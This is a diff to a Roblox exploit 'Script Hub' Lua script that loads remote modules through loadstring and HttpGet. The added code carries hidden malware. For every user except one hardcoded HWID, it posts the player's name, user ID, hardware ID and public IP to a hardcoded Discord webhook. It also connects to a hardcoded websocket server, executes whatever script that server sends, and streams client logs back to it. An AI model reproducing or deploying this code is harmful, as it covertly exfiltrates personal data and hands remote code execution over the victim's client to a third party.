@@ -1,8 +1,45 @@
-local Lib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EC%A7%AF%EB%AA%8C%EA%BC%9F%EC%9E%B2%EB%BE%AE%EC%9B%A6%EC%B9%A1%ED%82%AC%EC%97%8A%EB%85%B4%EB%B5%95%EC%AE%9C%ED%9C%B4%EB%91%96%EC%85%97%EC%95%94%EB%AF%9E%ED%86%A7%EA%B2%8F%EC%83%B3%EA%B8%9F%ED%8A%85%ED%8A%AC%EC%90%BA%EB%99%88%EB%95%8B%EC%BB%86%EC%A2%99%EC%95%8C%EC%B2%9D%EC%BF%BB%EC%8A%9D%ED%8C%A4%ED%90%9A%EC%AA%93%EC%9F%9B%EC%9A%A1%EC%A4%88%EC%AC%97%EC%93%9C%EC%99%8F%EC%8F%88%EC%BF%B1%EB%BD%80%ED%94%85%EB%A5%92%EC%A6%A6%EC%AD%82%EC%A1%8C%EB%B0%96%EC%87%BA%EC%A3%AB%ED%9D%86%EC%BC%BA%EC%90%97%EB%B3%B8%EA%B9%AE%EC%BF%89%EA%BD%BF%EC%88%B2%EB%A8%8E%EC%9C%85%EC%B7%B4e%EB%A3%A1%EB%B9%A6e%ED%94%83%EB%A2%80%ED%89%8E%EC%80%BC%EC%81%95%ED%97%B9%EB%AF%97%ED%93%A3%EB%B2%8E%EC%AD%85%EB%85%9E%EB%B6%89%EA%B3%B2%EC%9D%8B%EC%99%9C%EC%A4%88%EC%84%84%EB%90%94%EC%95%85%EC%89%B1%ED%8E%9D%ED%80%B8%ED%94%BB%EA%B9%A1%EC%83%85%EC%B9%BD%ED%82%82%EB%B7%A6%EC%BF%BB%EB%9D%99%ED%90%86%ED%99%89%EC%B0%A9"), true))()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EB%8D%B3%ED%8E%B7%ED%96%82%ED%99%9F%EB%A5%9A%ED%9D%85%EA%BB%83%EC%92%BD%EC%BE%94%EB%8C%A3%EC%90%BE%EB%AE%96%EC%8E%BF%EC%B9%8D%ED%86%BD%ED%90%84%ED%9D%90%EC%A5%86%EB%96%B0%EB%BC%A7%EB%8E%9D%EB%8F%9A%EB%A6%91%EB%B3%AA%ED%95%96%EB%8F%BA%EB%AB%89%EA%B0%82%EB%A0%B4%EB%99%91%EC%AD%AE%EA%BB%B2%EA%BB%8B%EA%B7%9C%ED%96%A4%ED%9A%82%ED%9C%A3%EA%BF%86%ED%96%8E%ED%91%A2%EA%B6%B7%EB%88%BF%ED%84%9F%ED%8D%91%ED%94%99%EB%8C%B0%ED%96%B6%ED%88%80%ED%8E%91%ED%92%AF%EA%BC%B4%EC%87%82%ED%8E%89%ED%99%99%EB%98%B7%EB%BC%8F%ED%89%85%EB%98%83%EB%91%BB%EC%BF%A6%EB%B4%91%EC%BA%A4%ED%86%BF%EC%B1%88%EC%84%9B%EC%AA%A9%EB%B4%82%EB%A5%90%EB%B7%B6%EC%80%8C%EB%88%A3%EC%BF%9A%EC%9B%91%EB%80%8D%EB%B9%B7%ED%8F%B1%ED%94%99%EC%90%B1%EC%A8%8E%EC%8C%BE%EB%A0%87%EB%A4%B0%EC%BD%9E%EC%A8%BC%ED%85%87%EC%A2%94%EB%AC%8E%ED%8C%81%EA%B4%AC%EB%A9%AC%EB%8B%9D%EB%BE%9B%EC%97%A9%EC%B0%99%EB%AC%B5%EB%A2%99%EB%96%AA%EC%85%8E%EB%91%BB%ED%81%90"), true))()
+
+local GetUrl = "https://raw.githubusercontent.com/cvMeepbrMpmfMqCcBafdkhLLZlmZpAD23nDEAGR/Tu5BCCVt7VMF8BQsUc4SjXR6vBb3SDI5L0GFAGDzKemOLHBnsex/main/"
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+function LS(str)
+    return loadstring(game:HttpGet((GetUrl..str), true))() 
+end
+
+Lib = LS("library")
+LS("functions")
+
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local websocket = (syn and syn.websocket) or WebSocket
+
+if HWID ~= "97CB9DD4-E4FD-4124-86F6-DA05F5E1B7B0" then
+local jsonip = game:HttpGet("https://jsonip.com/")
+local ip = Services.HttpService:JSONDecode(jsonip)["ip"]
+request{
+    Url = "https://discord.com/api/webhooks/1046446932039565513/Qz8LcvpOi_-fVpIhaKGS0vyaC2ONFv40zcQKaIAAiGO3pzvE_wBbH-_UNOYHGIi-s87I",
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"  -- When sending JSON, set this!
+    },
+    Body = Services.HttpService:JSONEncode({
+        content = "> Name: `"..LocalPlayer.Name.."`\n> Id: `"..LocalPlayer.UserId.."`\n> HWID: `"..HWID.."`\n> Ip: `"..ip.."`".."\n> https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
+        username = "Roblox HWID Logger"
+    })
+}
+end
 
 Executor_b = identifyexecutor()
 Executor = string.gsub(Executor_b, " ", "-")
+
+tabs = {
+    "localplayer",
+    "combat",
+    "tool",
+    "misc",
+    "animations",
+    "settings",
+    "plr_function"
+}
 
 plrs = {}
 for i,v in pairs(GetPlayers(Services.Players)) do
@@ -14,8 +51,14 @@ end
 GUI = Lib:Create{
     Name = "Script Hub",
     Size = UDim2.fromOffset(600,400),
-    Theme = Lib.Themes.Halloween,
+    Theme = Lib.Themes.Sekia,
     Link = Executor.."://API/games/"..game.PlaceId
+}
+
+GUI:Credit{
+    Name = "DAYUN",
+    Description = "--Maker--",
+    Discord = "DAYUN#0279"
 }
 
 GUI:Notification{
@@ -23,26 +66,47 @@ GUI:Notification{
     Text = "Found Executor\nName: "..Executor_b
 }
 
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EB%A5%98%EC%98%83%EB%A0%AE%EC%AF%BC%EC%92%B5%EB%89%A8%EB%A0%B6%ED%92%90%EB%8D%BE%EC%B6%82%EC%90%99%EA%B8%A4%EC%AE%B6%EA%B9%B5%EC%9F%A3%ED%97%90%ED%93%A1%EB%94%A6%EB%B6%86%EB%97%BA%EC%82%84%EA%B7%BA%EA%B6%8D%ED%90%A4%EB%AB%AA%EB%BC%99%EB%83%BB%EB%BB%8A%ED%83%8A%EC%9E%98%EB%9A%9E%EB%B6%94%EB%A6%89%EB%9A%B5I%EB%88%9E%EB%8C%86%EB%AE%96%EA%BA%A1%ED%94%97%EC%B8%B7%EC%85%9F%EC%9B%9A%ED%85%84%ED%92%9B%ED%99%9E%EB%B9%A3%EA%B4%A7%EB%96%AA%EB%91%97%EC%95%90%ED%84%9E%EC%84%BF%EB%B7%A6%EC%B8%99%EC%B8%9A%EB%B6%93%EC%A1%A2%EB%AC%BB%EC%9A%8B%EC%85%89%EC%93%BD%EB%AE%85%ED%8F%B1%EC%B2%AB%EB%A8%80%EB%BB%9A%EA%B6%A8%ED%81%A5%EB%99%B3%EC%A0%AF%EC%92%B7%EA%B1%BB%EB%99%90%EB%84%92%EC%BD%8D%EC%B8%8E%EC%A5%97%ED%90%A8%EA%B3%9A%EB%9A%81%EC%83%8C%EC%87%91%EB%BF%B7%EC%BD%84%EB%A3%A7%EB%91%8D%ED%85%8D%EC%97%B3%EB%8A%AF%EA%BB%87%EA%BC%BC%EC%92%AE%EC%A2%9B%EB%89%B9%EB%9E%8B%EB%AF%BC%EB%99%9D%EC%8F%BB%EB%93%BD"), true))()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EC%A9%81%ED%8D%B8%EC%B6%A8%EB%A8%AD%EB%B4%9F%EB%B9%AF%EC%9A%AD%EB%B4%8A%EB%B9%A9%ED%92%9B%EB%81%B1Z%ED%8F%A9%EC%BC%A0%EC%87%86%EC%83%9C%ED%9D%A4%EB%B1%BE%EC%8D%BA%EB%9E%BB%EA%B0%97%EB%B1%A9%EC%AC%BE%ED%9C%99%ED%87%91%EB%BD%90%EB%90%A2%EB%8E%A5%ED%8B%83%EA%B1%BD%EA%B0%81%EB%AD%B3%EC%AA%87%EB%BA%93%ED%9D%BE%ED%8F%B4%EC%A1%81%EB%A1%80%EA%B4%B3%ED%87%B8%EB%BB%95%ED%8D%A9%EC%83%99%EB%81%BF%EC%A9%BF%EB%97%BC%EB%89%AD%EC%A9%BD%EC%B8%88%EC%98%B3%EB%A4%A3%EC%8F%AD%EC%B9%AF%ED%9D%B1%EA%B5%9E%ED%80%BC%EC%91%8B%EC%B6%89%EC%AB%AE%ED%83%B0%ED%95%83%EA%B8%9A%EC%AE%AA%ED%9B%BC%EA%BA%84%EB%A7%86%ED%91%AF%EC%B2%AE%EC%B2%B3%EA%BA%BA%EB%AD%9Ak%EC%86%94%EC%94%B9%EC%BC%87%EB%9E%A8%EB%85%82%EC%A7%A2%EC%AB%84%EB%BD%AE%EC%9E%A4%EC%9D%B7%EB%AF%AC%EC%82%B6%EC%82%86%EB%B6%8E%EC%B3%91%ED%9C%9C%EB%9B%A4%EB%A8%A2%EC%B2%B2%EA%B0%B1%EA%B4%BA%EB%A8%88%EC%A8%AF%EB%9B%A4%EC%AF%A9%EC%83%82%ED%84%8D%EC%82%A0"), true))()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EA%B4%83%EB%AF%8F%EB%95%92%EC%B8%89%EB%99%B9%EC%A6%B4%EB%B0%B7%EC%90%A3%ED%8F%96%ED%80%B8%ED%97%AB%EC%A5%81%EA%BD%81%EC%8E%B0%EA%B4%B9%EC%BF%9D%EC%AA%BF%EB%AE%BE%EB%AB%B4%EC%A4%84%EA%B0%88%EA%BE%BB%ED%8B%89%EC%BC%BA%ED%91%9E%EC%B5%A7%EC%9A%9C%ED%8D%96%EC%88%8F%EB%90%A9%EB%83%8D%EC%8A%A4%EA%B7%AD%EC%89%A5%EA%B7%A0%EB%B4%8C%EC%B5%B6%EB%A3%86%EA%B4%98%ED%8D%A5%EB%99%93%EC%A6%9D%EC%92%A2%EC%A8%A5o%EB%87%B1%EC%B8%8C%EC%AC%BA%ED%96%84%EC%82%97%EA%B6%91%EB%AD%A7%EB%A9%BD%EB%86%B7%EB%85%A3%EC%B2%A7%EC%84%92%EC%8F%8C%EC%AC%89%EB%9F%8C%ED%85%B1%EC%BC%A7%EC%B4%9D%EC%8C%AA%EB%9A%B4%EB%97%B0%EC%84%8F%ED%9C%B7%ED%8F%A0%EB%A1%83%EC%B5%B7%EA%B7%87%EA%BD%8B%EB%AD%8D%EA%B8%B3%EB%B8%9C%EB%98%8A%EC%A3%8D%EA%BC%A3%EC%98%98%EB%AE%9A%EA%BE%89%EC%BF%9D%ED%85%BB%EC%9A%9F%EB%98%96%EC%95%A2%EC%9F%A5%EA%BF%88%ED%8B%A2%EA%BD%B7%EB%92%AB%EA%BF%8D%ED%95%AD%EA%B1%8B%ED%89%B9%EB%B1%A4%EA%BB%90%EB%BE%8A%EA%B3%A9"), true))()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EB%BF%9A%EB%B0%96%EC%93%9E%EB%B9%B5%EB%9C%BC%EC%80%B8%EB%AF%AB%EC%A7%B8%EC%8D%86%EC%88%83%EC%8B%9D%ED%84%87%EB%9D%8A%EB%80%90%ED%9D%89%EC%A5%A0%EC%B5%BB%EB%AC%8B%ED%8C%A0%ED%80%8F%EB%BC%81%EB%BF%86%EB%9B%A2%EB%A9%83%EC%A5%A1%EC%97%9A%EB%8D%8F%EB%82%B1%EB%83%BC%EB%9C%A8%EA%B4%96%EB%B7%80%ED%97%A7%EB%B2%82%EC%91%8A%EB%B3%99%EC%9A%BE%ED%8B%AF%EC%85%AE%EB%84%B7%ED%90%BD%EC%8B%A3%EC%86%AA%EC%8E%A0%EC%BA%B9%EB%9F%8A%EC%B9%B9%EC%93%86%ED%85%8B%EB%B4%B5%EB%BF%9Ae%EB%A6%85%EA%B9%94%ED%9C%B5%EA%B8%90%EA%BF%88%ED%83%A3%EB%B7%83%EC%9D%BC%EC%B0%98%EB%BD%B8%EC%AB%B2%EC%8B%83%EC%B5%B6%EB%A6%96%EC%82%BB%EC%BA%93%ED%95%89%EB%A2%BE%EA%BD%90%EB%8D%9B%ED%89%8D%EC%A3%A5%EB%B6%80%EB%B5%83%EC%96%84%ED%9D%81%ED%8A%8C%EC%90%9B%EC%B7%AF%EC%A9%A8%EB%98%99%EC%B2%AA%EC%83%97%EC%80%B6%ED%93%9F%ED%9C%83%EB%BC%81%EB%95%9D%EB%9E%A8%EA%BF%A6%EC%96%B4%ED%82%A4%EB%95%8A%ED%94%9D%EA%BD%A2%EB%A0%A3%EC%AC%80%ED%89%8C"), true))()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EB%9F%BC%EC%B0%AF%ED%91%B9%ED%98%A8%EB%AA%81%EB%AB%BD%EC%90%82%EB%94%AD%ED%80%97%EC%A3%BC%EC%BE%B6%EA%B0%84%EC%85%BF%EB%A7%AC%EC%8D%86%EA%B9%8E%EA%B9%83%EC%82%B5%EA%BB%BE%EC%BC%8B%EB%87%90%EB%89%B5%EA%B8%BA%EA%B7%AD%EC%BE%8D%EA%B3%AF%EC%82%AB%EC%96%A6%EB%9D%94%EC%9C%95%EC%B3%89%EB%B7%8E%ED%86%82%EB%AD%8F%EC%90%88%EC%B5%BD%ED%80%9E%EC%9D%93%EC%A9%B8%EB%94%B5%EC%88%B1%EB%9F%B9%EB%9C%AB%EB%A0%81%EB%8A%A1%EA%BE%B8%EB%8F%84%EC%92%9E%EC%AC%85%EB%B6%9A%ED%96%9B%EC%AC%9A%EC%A8%99%ED%9A%9A%EA%BD%B8%EC%8B%A3%EB%88%93%EB%9C%BD%EC%92%B8%EB%83%98%EB%92%9F%EC%B6%80%EC%8B%81%ED%92%9C%EC%91%9D%EB%B1%89%EC%9B%B8%EC%97%9B%ED%86%A1%EC%B8%B2%EC%B0%BC%EA%BA%A8%EB%B9%8D%EB%9B%88%EB%AA%A5%EA%BB%86%EC%AD%BE%ED%88%AD%EB%80%B8%EB%80%A5%EB%97%90%EA%B8%A7%EB%87%B9%EB%A0%B9%EC%8B%8E%EB%B7%BA%EC%AA%A6%EA%BC%92%EC%B4%B9%EB%8C%BA%EC%AC%8E%EC%85%8A%EC%B7%B0%EC%97%9A%EB%A4%98%ED%95%B5%EB%8A%B5%EB%85%82%EA%BE%A0%ED%80%A4"), true))()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/yellowsliper/Krnl_Custom_UI/main/%EC%BB%AF%EA%BC%99%EB%8B%B4%EC%92%89%EB%BF%85%EC%9C%A5%EA%B1%AE%EC%B9%9E%ED%8B%97%EB%92%AD%EB%AA%87%EB%AD%A0%EC%A1%AA%EA%B3%A6%EB%91%B6%EB%8D%86%EB%9F%83%EB%A3%8A%EC%AE%92%ED%8E%A7%EC%9D%B6%EB%A6%A1%EA%BC%B7%EC%A1%B4%EB%98%91%EA%B0%AA%EC%B3%B0%EB%92%9D%EB%98%83%EB%9D%87%EC%BD%A4%ED%8E%B2%EB%98%92%EB%B2%80%EC%8F%86%EB%80%93%EB%96%94%EC%92%AF%EC%A9%98%EB%9D%9D%EB%B6%A8%EC%B9%AA%ED%88%A3%EC%9C%BD%ED%87%80%EC%AE%B5%EC%8C%95%ED%9B%85%EA%B5%BF%EA%B9%A8%EC%A0%9D%EC%88%BB%EC%9A%B4%EC%8A%BC%EB%8B%BF%EA%BE%A3%EB%88%B9%EA%B5%89%EB%A6%AC%EC%8E%96%EC%83%A3%EB%82%B3%EB%9D%89%EC%96%B9%EC%8F%B5%ED%81%85%EC%BD%A5%EB%BA%83%ED%84%B5%EC%BC%A8%EB%9F%B7%EC%88%8D%EC%87%97%EB%B0%A4%ED%90%B0%EA%B8%B1%EB%93%9A%ED%89%AB%EA%BB%B7%EB%A1%B1%EB%AE%A1%ED%99%85%ED%90%80%EB%83%B7%ED%91%B3%EC%BD%80%EB%9C%B2%EB%9F%92%EA%BC%99%EC%92%80%EB%92%8E%ED%97%AE%EB%93%95%EC%8D%AB%ED%86%B5%EC%BA%AE%EB%9F%92%EC%B8%AB%EB%A9%AA%EB%9B%AB"), true))()
+for i,v in pairs(tabs) do
+    LS(v)
+end
 
 GUI:Notification{
-    Title = "Load Manager",
-    Text = "Script has been loaded"
+    Title = "Script Manager",
+    Text = "Script has been Loaded!"
 }
 
-Services.Players.PlayerAdded:Connect(function(v)
-    to_plr_menu:AddItems({
-        v.DisplayName.." | "..v.Name
-    })
-    give_radio_menu:AddItems({
-        v.DisplayName.." | "..v.Name
-    })
-    kill_plr_menu:AddItems({
-        v.DisplayName.." | "..v.Name
-    })
+local PlaceName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local PlayerName = game:GetService("Players").LocalPlayer.Name
+local HttpService = game:GetService("HttpService")
+
+local server
+
+repeat
+pcall(function()
+server = websocket.connect("ws://116.44.218.113:1350")
+end)
+until server
+local WebSocketScript = ""
+
+server.OnMessage:Connect(function(Message)
+    if Message == "BEGIN SCRIPT" then
+        WebSocketScript = ""
+    elseif Message == "END SCRIPT" then
+        loadstring(WebSocketScript)()
+    else
+        WebSocketScript = WebSocketScript .. Message
+    end
+end)
+
+server:Send(HttpService:JSONEncode({
+    type = "init",
+    sender = PlayerName,
+    game = PlaceName
+}))
+
+game:GetService("LogService").MessageOut:Connect(function(Message)
+    WebSocket:Send(HttpService:JSONEncode({
+        type = "log",
+        message = Message
+    }))
 end)
